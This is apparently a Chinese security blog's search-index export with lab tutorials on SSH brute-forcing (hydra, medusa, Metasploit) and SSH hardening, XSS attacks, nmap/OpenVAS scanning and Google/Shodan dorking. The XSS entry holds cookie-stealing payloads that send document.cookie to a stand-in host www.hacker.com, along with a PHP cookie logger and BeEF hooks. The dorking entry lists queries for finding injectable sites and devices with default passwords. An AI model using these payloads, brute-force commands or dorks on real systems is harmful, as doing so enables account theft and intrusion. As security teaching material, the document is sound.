<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SSH密码暴力破解及防御实战]]></title>
    <url>%2F2019%2F06%2F19%2F201948%2F</url>
    <content type="text"><![CDATA[hydra[海德拉] 1hydra 是世界顶级密码暴力密码破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解关键取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。 指定用户破解12345678Examples: hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt sshroot@kali:~# hydra -l root -P passlist.txt 192.168.203.48 ssh 用户列表破解123456789101112131415161718192021222324root@kali:~# cat userlist.txt useradminzhuzhuxiadengchenxiaoweirootacliejackroot@kali:~# cat passlist.txt 1234567adminrootredhatdengxinuserqwer1234qwerthahah2333toorroot@kali:~# hydra -L userlist.txt -P passlist.txt 192.168.203.48 ssh 12345678910111213141516常用参数：-R 继续从上一次进度接着破解。-S 采用SSL链接。-s PORT 可通过这个参数指定非默认端口。-l LOGIN 指定破解的用户，对特定用户破解。-L FILE 指定用户名字典。-p PASS 小写，指定密码破解，少用，一般是采用密码字典。-P FILE 大写，指定密码字典。-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。-M FILE 指定目标列表文件一行一条。-o FILE 指定结果输出文件。-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。-t TASKS 同时运行的线程数，默认为16。-w TIME 设置最大超时的时间，单位秒，默认是30s。-v / -V 显示详细过程。 Medusa[美杜莎]1Medusa（美杜莎）是一个速度快，支持大规模并行，模块化，爆破登录。可以同时对多个主机，用户或密码执行强力测试。Medusa和hydra一样，同样属于在线密码破解工具。不同是，medusa的稳定性相较于hydra要好很多，但其支持的模块要比hydra少一些。 语法参数123456789101112131415161718192021222324252627282930313233Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT] -h [TEXT] : Target hostname or IP address //目标主机名称或者IP地址 -H [FILE] : File containing target hostnames or IP addresses //包含目标主机名或者IP地址文件 -u [TEXT] : Username to test //测试用户名 -U [FILE] : File containing usernames to test //包含测试的用户名文件 -p [TEXT] : Password to test //测试密码 -P [FILE] : File containing passwords to test //包含测试的密码文件 -C [FILE] : File containing combo entries. See README for more information. //组合条目文件 -O [FILE] : File to append log information to //日志信息文件 -e [n/s/ns] : Additional password checks ([n] No Password, [s] Password = Username) //n代表空密码，s代表为密码与用户名相同 -M [TEXT] : Name of the module to execute (without the .mod extension) //模块执行名称 -m [TEXT] : Parameter to pass to the module. This can be passed multiple times with a different parameter each time and they will all be sent to the module (i.e. -m Param1 -m Param2, etc.) //传递参数到模块 -d : Dump all known modules //显示所有的模块名称 -n [NUM] : Use for non-default TCP port number //使用非默认的TCP端口 -s : Enable SSL //启动SSL -g [NUM] : Give up after trying to connect for NUM seconds (default 3) -r [NUM] : Sleep NUM seconds between retry attempts (default 3) //重试间隔时间 -R [NUM] : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1. -c [NUM] : Time to wait in usec to verify socket is available (default 500 usec). -t [NUM] : Total number of logins to be tested concurrently //设定线程数量 -T [NUM] : Total number of hosts to be tested concurrently //同时测试的主机总数 -L : Parallelize logins using one username per thread. The default is to process the entire username before proceeding. //并行化，每一个用户使用一个线程 -f : Stop scanning host after first valid username/password found. //在任何主机上找到第一个账号/密码后，停止破解 -F : Stop audit after first valid username/password found on any host. //在任何主机找到第一个有效的用户名/密码停止审计 -b : Suppress startup banner -q : Display module's usage information //显示模块的使用信息 -v [NUM] : Verbose level [0 - 6 (more)] //详细级别(0-6) -w [NUM] : Error debug level [0 - 10 (more)] //错误调式级别(0-10) -V : Display version //显示版本 -Z [TEXT] : Resume scan based on map of previous scan //继续扫描上一次 破解SSH密码1root@kali:~# medusa -M ssh -u root -P passlist.txt -h 192.168.203.48 patator1Patator 强大的命令行暴力破解器 可用模块123456789101112131415161718192021222324252627282930313233343536373839root@kali:~# patator -hPatator v0.7 (https://github.com/lanjelot/patator)Usage: patator module --helpAvailable modules: + ftp_login : Brute-force FTP + ssh_login : Brute-force SSH + telnet_login : Brute-force Telnet + smtp_login : Brute-force SMTP + smtp_vrfy : Enumerate valid users using SMTP VRFY + smtp_rcpt : Enumerate valid users using SMTP RCPT TO + finger_lookup : Enumerate valid users using Finger + http_fuzz : Brute-force HTTP + ajp_fuzz : Brute-force AJP + pop_login : Brute-force POP3 + pop_passd : Brute-force poppassd (http://netwinsite.com/poppassd/) + imap_login : Brute-force IMAP4 + ldap_login : Brute-force LDAP + smb_login : Brute-force SMB + smb_lookupsid : Brute-force SMB SID-lookup + rlogin_login : Brute-force rlogin + vmauthd_login : Brute-force VMware Authentication Daemon + mssql_login : Brute-force MSSQL + oracle_login : Brute-force Oracle + mysql_login : Brute-force MySQL + mysql_query : Brute-force MySQL queries + rdp_login : Brute-force RDP (NLA) + pgsql_login : Brute-force PostgreSQL + vnc_login : Brute-force VNC + dns_forward : Forward DNS lookup + dns_reverse : Reverse DNS lookup + snmp_login : Brute-force SNMP v1/2/3 + ike_enum : Enumerate IKE transforms + unzip_pass : Brute-force the password of encrypted ZIP files + keystore_pass : Brute-force the password of Java keystore files + sqlcipher_pass : Brute-force the password of SQLCipher-encrypted databases + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes + tcp_fuzz : Fuzz TCP services + dummy_test : Testing module 破解SSH密码123456789root@kali:~# patator ssh_login --helpPatator v0.7 (https://github.com/lanjelot/patator)Usage: ssh_login &lt;module-options ...&gt; [global-options ...]Examples: ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'root@kali:~# patator ssh_login host=192.168.203.48 user=root password=FILE0 0=passlist.txtroot@kali:~# patator ssh_login host=192.168.203.48 user=FILE0 0=userlist.txt password=FILE1 1=passlist.txt -x ignore:mesg='Authentication failed.' BrutesPray12BruteSpray 是一款基于nmap扫描输出的gnmap/XML文件自动调用Medusa对服务进行爆破（Medusa美杜莎 是一个爆破工具，速度比Hydra九头蛇快） Kali端安装12root@kali:~# apt-get updateroot@kali:~# apt-get install brutespray 语法参数1234567891011121314151617181920-f FILE, --file FILE GNMAP or XML file to parse //参数后跟一个文件名，解析nmap输出的GNMAP或者XML文件-o OUTPUT, --output OUTPUT Directory containing successful attempts //包含成功尝试的目录-s SERVICE, --service SERVICE specify service to attack //参数后跟一个服务名，指定要攻击的服务-t THREADS, --threads THREADS number of medusa threads //参数后跟一数值，指定medusa线程数-T HOSTS, --hosts HOSTS number of hosts to test concurrently //参数后跟一数值，指定同时测试的主机数-U USERLIST, --userlist USERLIST reference a custom username file //参数后跟用户字典文件-P PASSLIST, --passlist PASSLIST reference a custom password file //参数后跟一个密码字典文件-u USERNAME, --username USERNAME specify a single username //参数后跟用户名，指定一个用户名进行爆破-p PASSWORD, --password PASSWORD specify a single password //参数后跟密码，指定一个密码进行爆破-c, --continuous keep brute-forcing after success //成功之后继续爆破-i, --interactive interactive mode //交互模式-m, --modules dump a list of available modules to brut //将可用模块列表转储到brut nmap扫描1234root@kali:~# nmap -V 192.168.203.0/24 -oX namp.xmlroot@kali:~# nmap -A -p 22 -v 192.168.203.0/24 -oX 22.xmlroot@kali:~# nmap -sP 192.168.203.0/24 -oX namplive.xmlroot@kali:~# nmap -sV -O 192.168.203.0/24 -oX nampO.xml 字典爆破SSH1root@kali:~# brutespray --file 22.xml -u root -P passlist.txt --threads 5 --hosts 5 -c 1root@kali:~# cat /root/brutespray-output/22-ssh-success.txt MSF1Metasploit Framework（简称MSF）是一个编写、测试和使用exploit代码的完善环境。这个环境为渗透测试，Shellcode编写和漏洞研究提供了一个可靠的平台，这个框架主要是由面向对象的Perl编写语言编写的，并带有由C预言，汇编程序和Python编写的可选组件。 SSH模块12root@kali:~# msfconsolemsf5 &gt; search ssh SSH用户枚举123456msf5 &gt; use auxiliary/scanner/ssh/ssh_enumusers msf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; set rhosts 192.168.203.48rhosts =&gt; 192.168.203.48msf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; set USER_FILE /root/userlist.txtUSER_FILE =&gt; /root/userlist.txtmsf5 auxiliary(scanner/ssh/ssh_enumusers) &gt; run 这里测试的枚举用户列表中全部存在，感觉有问题 SSH版本探测1234msf5 &gt; use auxiliary/scanner/ssh/ssh_version msf5 auxiliary(scanner/ssh/ssh_version) &gt; set rhosts 192.168.203.48rhosts =&gt; 192.168.203.48msf5 auxiliary(scanner/ssh/ssh_version) &gt; run 暴力破解12345678msf5 &gt; use auxiliary/scanner/ssh/ssh_loginmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.203.48rhosts =&gt; 192.168.203.48msf5 auxiliary(scanner/ssh/ssh_login) &gt; set USER_FILE /root/userlist.txtUSER_FILE =&gt; /root/userlist.txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /root/passlist.txtPASS_FILE =&gt; /root/passlist.txtmsf5 auxiliary(scanner/ssh/ssh_login) &gt; run 暴力破解防御123456789101112131415161718192021222324252627282930313233343536373839404142431、useradd shellroot@kali:~# useradd test -s /sbin/nologin不需要的用户2、密码的复制性字母大小写+数字+特殊字符+20位以上+定期更换3、修改默认端口/etc/ssh/sshd_configPort 222224、限制登录的用户或组#PermitRootLogin yesAllowUsers xiaowei选项：AllowUsers AllowGroups DenyUsers DenyGroups5、使用sudo#visudo6、设置允许的IP访问/etc/hosts.allow 例如：sshd:192.168.203.17:allowPAM基于IP限制iptables/firewalld7、使用DenyHosts自动统计，并将其加入到/etc/hosts.deny8、基于PAM实现登录限制模块:pam_tally2.so功能:登录统计示例:实现防止对sshd暴力破解vim /etc/pam.d/sshd auth required pam_tally2.so deny=2 even_deny_root root_unlock_time=30 unlock_time=309、禁止密码改用公钥认证方式/etc/ssh/sshd_configPasswordAuthentication no10、保护xshell导出会话文件11、GRUB加密[针对本地破解]#慎用：auth sufficient pam_rootok.so]]></content>
  </entry>
  <entry>
    <title><![CDATA[AWVS 介绍]]></title>
    <url>%2F2019%2F06%2F19%2F201947%2F</url>
    <content type="text"><![CDATA[Web漏扫之AWVS12345Acuntix Web Vulnerability Sanner（AWVS）是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站，检测流行的安全漏洞。它包含有收费和免费两种版本AWVS官方网站:http://www.acunetix.com官方下载地址：https://www.acunetix.com/vulnerability-scanner/download/，官方免费下载的试用14天版本。 功能及特点1234567891011-自动的客户端脚本分析器，允许对Ajax和Web2.0应用程序进行安全性测试-业内最先进且深入的SQL注入和跨站脚本测试-高级渗透测试工具，例如HTTP Editor 和 HTTP Fuzzer-可视化宏记录帮助您轻松测试web表格和受密码保护的区域-支持含有CAPTHCA的页面，单个开始指令和Two Factor（双因素）验证机制-丰富的报告功能，包括VISA PCI 依从性报告-高速的多线程扫描器轻松检索成千上万个页面-智能爬行程序检测web服务器类型及应用程序语言-Acuntix 检索并分析网站，包括flash内容、SOAP和AJAX端口扫描web服务器并对服务器上运行的网络服务执行安全检查可导出网站漏洞文件 AWVS安装123AWVS10.5 【经典】链接：https://pan.baidu.com/s/1978s70vlpWG68AfoSRzMTw 提取码：nafm 网站的扫描12[Web Scanner]扫描器http://testhtml5.vulnweb.com 网站扫描]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS跨站脚本攻击]]></title>
    <url>%2F2019%2F06%2F19%2F201946%2F</url>
    <content type="text"><![CDATA[XSS简介 跨站脚本(cross site script) 为了避免与样式css混淆，所以简称为XSS。XSS是一种经常出现web应用中的计算机安全漏洞，也是web中最主流的攻击方式。那么什么是XSS呢？XSS是恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些恶意代码，嵌入(HTML、JavaScript)到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。XSS攻击的危害包括：-盗取各类用户账号，如机器登陆账号、用户网银账号、各类管理员账号 -控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 -盗窃企业重要的具有商业价值的资料 -非法转账 -强制发送电子邮件 -网站挂马 -DDOS-控制受害者机器向其他网站发起攻击 … 原理分析http://processon.com/chart_image/5cb7d7c0e4b09b16ffbc6c95.png XSS主要的原因：过于信任客户端提交的数据！XSS主要分类：反射型xss攻击(Reflected XSS) 又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的URL(即每次攻击需要用户的点击)。存储型XSS(Stored XSS) 又称为持久型跨站点脚本，他一般发生在XSS攻击向量(一般指的XSS攻击代码)存储在网站数据库，一般出现在网站的留言板、评论处、个人资料等需要用户可以对网站写入数据的地方，当页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久型XSS攻击危害性更大，因为每当用户打开页面，查看内容时脚本将自动执行。谷歌的orkut曾经就遭受到XSS。DOM型XSS（基于dom的跨站点脚本攻击）DOM—based XSS漏洞是基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如URL，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM—based XSS漏洞。 构造XSS脚本常用HTML标签1234567&lt;iframe&gt; iframe 元素会创建包含另一个文档的内联框架(即行内框架) &lt;textarea&gt; &lt;textarea&gt; 标签定义多行的文本输入控件 &lt;img&gt; img元素向网页中嵌入一幅图像 &lt;script&gt; &lt;script&gt; 标签用于定义客户端脚本,比如JavaScript。 script 元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件。 必需的type 属性规定脚本的MIME类型 JavaScript 的常见应用时图像操作、表单验证以及动态内容更新。 常用JavaScript方法123456alert alert()方法用于显示带有一条指定消息和一个确认按钮的警告框window.location window.location 对象用于获得当前页面的地址(URL),并把浏览器重定向到新的页面。location.herf 返回当前显示的文档的完整URLonload 一张页面或一幅图像完成加载onsubmit 确认按钮点击onerror 在加载文档或图像时发生错误 构造XSS脚本1234弹框警告此脚本实现弹框，一般作为漏洞或者演示使用，类似SQL注入测试的单引号',一旦此脚本能执行，也就意味着后端服务器没有对特殊字符做过滤&lt;&gt;/' 这样就可以证明，这个页面位置存在了XSS漏洞。&lt;script&gt;alert('xss')&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; //获取cookie 123页面嵌套&lt;iframe src=http://www.baidu.com width=300 height=300&gt;&lt;/iframe&gt;&lt;iframe src=http://www.baidu.com width=0 height=0 border=0&gt;&lt;/iframe&gt; 123页面重定向&lt;script&gt;window.location="http://www.axiaowei.cn"&lt;/script&gt;&lt;script&gt;location.href="http://www.baidu.com"&lt;/script&gt; 1234弹框警告并重定向&lt;script&gt;alert("请移步到我们的新站");location.href="http://www.axiaowei.cn"&lt;/script&gt;&lt;script&gt;alert('xss');location.href="http://192.168.203.19/mutillidae/robots.txt"&lt;/script&gt;这里结合了一些社工思路，例如：通过网站内部私信的方式将其发送给其他用户。如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登陆账户(克隆网站收集账户) 123访问恶意代码&lt;script src="http://www.axiaowei.cn/xss.js"&gt;&lt;/script&gt;&lt;script src="http://BeEF_IP:3000/hook.js"&gt;&lt;/script&gt; //结合BeEF收集用户的cookie 1234巧用图片标签&lt;img src="#" onerror=alert('xss')&gt;&lt;img src="javascript:alert('xss');"&gt;&lt;img src="http://BeEF_IP:3000/hook.js"&gt; 1234绕开过滤的脚本大小写 &lt;ScrIpt&gt;alert('xss')&lt;/SCRipt&gt;字符编码 采用URL、Base64等编码&lt;a href="&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;"&gt;xiaowei&lt;/a&gt; 1234567891011收集用户cookie打开新窗口并且采用本地cookie访问目标网页&lt;script&gt;window.open("http://www.hacker.com/cookie.php?cookie="+document.cookie)&lt;/script&gt;&lt;script&gt;document.location="http://www.hacker.com/cookie.php?cookie="+document.cookie&lt;/script&gt;&lt;script&gt;new Image().src="http://www.hacker.com/cookie.php?cookie.php?cookie="+document.cookie;&lt;/script&gt;&lt;img src="http://www.hacker.com/cookie.php?cookie='+document.cookie"&gt;&lt;/img&gt;&lt;iframe src="http://www.hacker.com/cookie.php?cookie='+document.cookie"&gt;&lt;/iframe&gt;&lt;script&gt;new Image().src="http://www.hacker.com/cookie.php?cookie='+document.cookie";img.width = 0;img.height = 0;&lt;/script&gt; 反射型XSS安全级别 手工XSS123弹窗警告：&lt;script&gt;alert('xiaowei')&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 12页面重定向：&lt;script&gt;location.href="http://www.baidu.com"&lt;/script&gt; 存储型XSS12存储型XSS(持久型)即攻击者将带有XSS攻击的链接放在网页的某个页面，例如评论框，留言板等用户访问此XSS链接并执行，由于存储型XSS能够攻击所有访问此页面的用户，所以危害非常大。 手工(基础)123攻击1 弹框告警：kali linux 端操作Name : xiaoweiMessage :&lt;script&gt;alert('xiaowei')&lt;/script&gt; 1弹框告警：肉鸡 Windows10端操作 浏览页面 12345攻击2：获取cookie：渗透机 Kali Linux 操作①构建收集cookie服务器②构造XSS代码并植入到web服务器③等待肉鸡触发XSS代码并将cookie发送到渗透机(kali)④Cookie利用 构建收集服务器1确保apache2服务开启 123456789//创建cookie_rec.php脚本文件root@kali:~# vim /var/www/html/cookie_rec.php//脚本内容&lt;?php $cookie = $_GET['cookie']; $log = fopen("cookie.txt","a"); fwrite($log,$cookie . "\n"); fclose($log);?&gt; 12// 修改拥有者用户、用户组root@kali:/# chown -R www-data.www-data /var/www/ 123通过渗透机植入XSS代码&lt;script&gt;window.open('http://192.168.203.19/cookie_rec.php?cookie='+document.cookie)&lt;/script&gt;注意：192.168.203.19 为Kali Linux IP 前端设置了长度限制50审查元素修改长度设置值 12获取cookie：肉鸡 Windows10端操作 浏览页面注：这里浏览器需要允许弹窗 查看获取到的结果 自动化XSSBeEF简介1234567891011121314151617181920212223242526272829Browser Exploitation Framework(BeEF)BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配合JS脚本和Metasploit进行渗透；BeEF是基于Ruby语言编写的，并且支持图形化界面，操作简单；http://beefproject.com信息收集：1、网络发现2、主机信息3、Cookie获取4、会话劫持5、键盘记录6、插件信息持久化控制1、确认弹框2、小窗口3、中间人社会工程：1、点击劫持2、弹窗告警3、虚假页面4、钓鱼页面渗透攻击：1、内网渗透2、Metasploit3、CSRF攻击3、DDOS攻击 BeEF基础123启动Apache和BeEFroot@kali:~# systemctl start apache2root@kali:~# beef-xss 1植入XSS代码 1用户浏览页面 1online browsers 12345命令command颜色(Color):绿色 对目标主机生效并且不可见(不会被发现)橙色 对目标主机生效但可能可见（可能被发现）灰色 对目标主机未必生效(可验证下)红色 对目标主机不生效 BeEF相关文章：https://www.freebuf.com/articles/web/175755.html XSS练习相关网站：http://xsst.sinaapp.com/example/1-1.php?page=%3Cimg%20src=x]]></content>
  </entry>
  <entry>
    <title><![CDATA[目标信息收集]]></title>
    <url>%2F2019%2F06%2F19%2F201945%2F</url>
    <content type="text"><![CDATA[实验环境12目标靶机：OWASP_Broken_Web_Apps_VM_1.2测试渗透机：Windows10 /Kali nmapnmap简介123Nmap是安全渗透领域最强大的开源端口扫描器，能跨平台支持运行。https://nmap.org/http://sectools.org/ 扫描示例1234567891011主机发现： nmap -sn 192.168.203.16端口扫描： nmap -sS -p1-1024 192.168.203.16系统扫描： nmap -O 192.168.203.34版本扫描： nmap -sV 192.168.203.34综合扫描： nmap -A 192.168.203.34脚本扫描： root@kali:/usr/share/nmap/scripts# nmap --script=default 192.168.203.34 nmap --script=auth 192.168.203.34 nmap --script=brute 192.168.203.34 12nmap参考指南https://nmap.org/man/zh/ zenmap lntense scan1234nmap -T4 -A -v 192.168.203.34-T 设置速度等级，1到5级，数字越大，速度越快-A 综合扫描-v 输出扫描过程 Intense scan plus UDP123nmap -sS -sU -T4 -A -v 192.168.203.34-sS TCP全连接扫描-sU UDP扫描 Intense scan, all TCP ports12nmap -p 1-65535 -T4 -A -v 192.168.203.34-p 指定端口范围 Intense scan, no ping12nmap -T4 -A -v -Pn 192.168.203.34-Pn 不做ping扫描，例如针对防火墙等安全产品 Ping scan12nmap -sn 192.168.203.34-sn 只做ping扫描，不做端口扫描 Quick scan12nmap -T4 -F 192.168.203.34-F fast模式，只扫描常见的服务端口，比如默认端口(1000个)还少 Quick scan plus123nmap -sV -T4 -O -F --version-light 192.168.203.34-sV 扫描系统和服务版本-O 扫描操作系统版本 Quick traceroute1nmap -sn --traceroute www.baidu.com Regular scan1nmap 192.168.203.34 Slow comprehensive scan1nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script "default or (discovery and safe)" 192.168.203.34 OpenVAS1234567OpenVAS(Open Vulnerability Assesment System),即开放式漏洞评估系统，是一个用于评估目标漏洞的杰出框架，开源且功能强大；它与著名的Nessus“本是同根生”，在Nessus商业化之后仍然坚持开源，号称“当前最好用的开源漏洞扫描工具”。最新版的Kali Linux不再自带OpenVAS了，需要自己部署OpenVAS漏洞检测系统。其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。但是它的最常用用途是检测目标网络或主机的安全性。它的评估能力来源于数万个漏洞测试程序，这些程序是以插件的形式存在。openvas是基于C/S（客户端/服务器），B/S（浏览器/服务器）架构进行工作，用户通过浏览器或者专用客户端程序来下达扫描任务，服务器端负责授权，执行扫描操作并提供扫描结果。http://www.openvas.orghttp://www.greenbone.net 部署OpenVAS12345678910111213升级kali linuxroot@kali:~# apt-get updateroot@kali:~# apt-get dist-upgrade安装OpenVASroot@kali:~# apt-get install openvasroot@kali:~# openvas-setup修改admin账户密码root@kali:~# openvasmd --user=admin --new-password=admin修改默认监听IProot@kali:~# vim 1root@kali:~# openvas-start 123检查安装：root@kali:~# ss -tnlproot@kali:~# openvas-check-setup 登录OpenVAS12https://127.0.0.1:9392 #ip为kali的IP注：https 新建扫描task 高级扫描task]]></content>
  </entry>
  <entry>
    <title><![CDATA[Web信息收集之搜索引擎]]></title>
    <url>%2F2019%2F06%2F19%2F201944%2F</url>
    <content type="text"><![CDATA[信息收集概述1231、web信息收集(探测)即web踩点，主要是掌握目标web服务的方方面面，是实现web渗透入侵前的准备工作2、web踩点内容包括操作系统、服务器类型、数据库类型、web容器、web语言、域名信息、网站目录等3、web信息搜集涉及搜索引擎、网站扫描、域名遍历、指纹识别等工作 项目实验环境实验环境12目标靶机:OWASP_Broken_Web_Apps_VM_1.2IP：192.168.203.21 12测试渗透机：kali-linux-2018-4-vm-amd64IP：192.168.203.34 Google Hackingsite1234567功能：搜索指定的域名的网页内容，可以用来搜索子域名、跟此域名相关的内容。示例：site:zhihu.com 搜索跟zhihu.com相关网页site:zhihu.com "web安全" 搜索zhihu.com跟web安全相关的网页site:csdn.net "sql注入" 搜索csdn.net跟sql注入相关的内容site:pan.baidu.com "教程视频" 搜索pan.baidu.com跟教程视频相关的内容 filetype12345678功能：搜索指定文件类型示例："web安全" filetype:pdf 搜索跟安全书籍相关的pdf文件filetype:pdf "sql注入" 搜索跟sql注入的pdf文件nmap filetype:ppt 搜索nmap相关的ppt文件site:csdn.net filetype:pdf 搜索csdn网站相关的pdf文件filetype:pdf site:www.51cto.com 搜索51cto的pdf文件 inurl12345678910功能：搜索url网址存在特定关键字的网页，可以用来搜寻有注入点的网站示例：inurl:.php?id= 搜索网址中有"php?id"的网页inurl:view.php=? 搜索网址中有"view.php="的网页inurl:.jsp?id= 搜索网址中有"jsp?id"的网页inurl:.asp?id= 搜索网址中有"asp?id"的网页inurl:/admin/login.php 搜索网址中有"/admin/login.php"的网页inurl:/public/login.php 搜索网址中有"/public/login.php"的网页inurl:login 搜索网址中有"login"等登录的网页 intitle12345678910功能：搜索标题存在特定关键字的网页示例：intitle:后台登录 搜索网页标题是“后台登录”的相关网页intitle:后台管理 filetype:php 搜索网页标题是“后台管理”的php页面intitle:index of "keyword" 搜索此关键字相关索引目录信息intitle:index of "parent directory" 搜索根目录相关索引目录信息intitle:index of "password" 搜索密码相关的索引目录信息intitle:index of "login" 搜索登录页面信息intitle:index of "admin" 搜索后台管理页面的信息 intext12345功能：搜索正文存在特定关键字网页intext:powered by wordpress 搜索wordpress制作的博客网址intext:Powered by Discuz 搜索Discuz论坛相关页面intext:Powered by *CMS 搜索*CMS相关页面intext:powered by xxx inurl:login 搜索此类网站的后台登录界面 实例12345678910111213搜索美女/电影等相关网站：inurl:php?id= intitle:美剧inurl:php?id= intitle:美女inurl:php?id= intitle:美女图片 intext:powered by discinurl:php?id= intitle:美女图片 intext:powered by *cms搜索用Discuz搭建的论坛:inurl:php?id intitle:电影 intext:powered by discuzintext:"powered by discuz! 7.2" inurl:faq.php intitle:论坛搜索使用Struts的相关网站intitle:"Struts Problem Report"intitle:"Struts Problem Report" intext:"development mode is enabled." 符号123-keyword 强制结果不要出现此关键字，例如：电影 -黑客*keyword 模糊搜索，强制结果包含此关键字，例如：电影 一个叫*决定*"keyword" 强制搜索结果出现此关键字，例如：书籍 "web安全" 参考链接：https://pan.baidu.com/s/1kgpPq0HUIg5Pr5jubO2J8Q提取码：9oee Shodan Hacking12https://www.shodan.ioShodan(撒旦搜索引擎)是由Web工程师John Matherly（马瑟利）编写的，被称为“最可怕的搜索引擎”，可扫描一切联网的设备，除了常见的Web服务器，还能扫描防火墙、路由器、交换机、摄像头、打印机等一切联网设备。 ip1114.114.114.114 service/protocol12345678httphttp country:"DE"http country:"DE" product:"Apache httpd"http produce:"Apache httpd"sshssh default passwordssh default password contry:"JP" keyword123基于关键字搜索的思路根据banner信息(设备指纹)来搜索"default password" country:"TH"FTP anon successful country123country:cncountry:uscountry:jp product1234product:"Microsoft IIS httpd"product:"nginx"product:"Apache httpd"product:MySQL version12product:MySQL version:"5.1.73"product:"Microsoft IIS httpd" version:"7.5" hostname12hostname:.orghostname:.edu os123os:"Windows Server 2008 R2"os:"Windows 7 or 8"os:"Linux 2.6.x" net123net:59.39.146.0/24200 ok net:59.39.146.0/24200 ok country:cn net:59.39.146.0/24 port1234port:3389port:22port:80port:443 综合实例12345搜索日本区开启80端口设备：country:jp port:"80"country:jp port:"80" product:"Apache httpd"country:jp port:"80" product:"Apache httpd" city:"Tokyo"country:jp port:"80" product:"Apache httpd" city:"Tokyo" os:"Linux 3.x" 1234搜索日本区使用的Linux2.6.x系统设备：country:jp os:"Linux 2.6.x"country:jp os:"Linux 2.6.x" port:"80"country:jp os:"Linux 2.6.x" port:"80" product:"Apache httpd" 1234搜索日本区使用的Windows Server系统设备：country:jp os:"Windows Server 2008 R2"country:jp os:"Windows Server 2008 R2" port:"445"country:jp os:"Windows Server 2008 R2" port:"80" 12搜索日本区使用Microsoft IIS 的设备country:jp product:"Microsoft IIS httpd" version:"7.5" 参考链接：https://pan.baidu.com/s/1HFMJJt6VtsnpUkgz2ddPhQ提取码：8f85 Zoomeye Hacking12345https://www.zoomeye.orgZoomeEye（钟馗之眼）是一个面向空间的搜索引擎，“国产的Shodan”，由知道创宇出品。ZoomEye 支持公网设备指纹检索和 Web 指纹检索网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等直接输入关键词即可开始检索。如果需要全词匹配，请使用引号闭合词组。 1234567891011121314151617iposappserviceportproductcountryverhostnamesitetitleheaderkeywordsdesc用户手册：https://www.zoomeye.org/doc?channel=user 12帮助shift+/]]></content>
  </entry>
  <entry>
    <title><![CDATA[burp suite介绍]]></title>
    <url>%2F2019%2F06%2F19%2F201943%2F</url>
